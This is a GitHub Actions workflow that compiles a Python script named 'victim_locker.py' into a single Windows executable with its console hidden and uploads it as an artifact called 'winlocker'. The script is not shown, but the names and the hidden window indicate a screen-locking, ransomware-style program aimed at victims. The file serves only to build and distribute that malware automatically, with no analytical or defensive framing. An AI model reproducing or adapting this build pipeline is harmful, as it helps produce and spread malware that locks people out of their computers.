name: Build EXE

on: [push]

jobs:
  build:
    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v4
    
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
        
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        
    - name: Build with Nuitka
      run: |
        python -m nuitka --onefile --windows-disable-console --mingw64 --assume-yes-for-downloads victim_locker.py
        
    - name: Upload EXE
      uses: actions/upload-artifact@v4
      with:
        name: winlocker
        path: victim_locker.exe
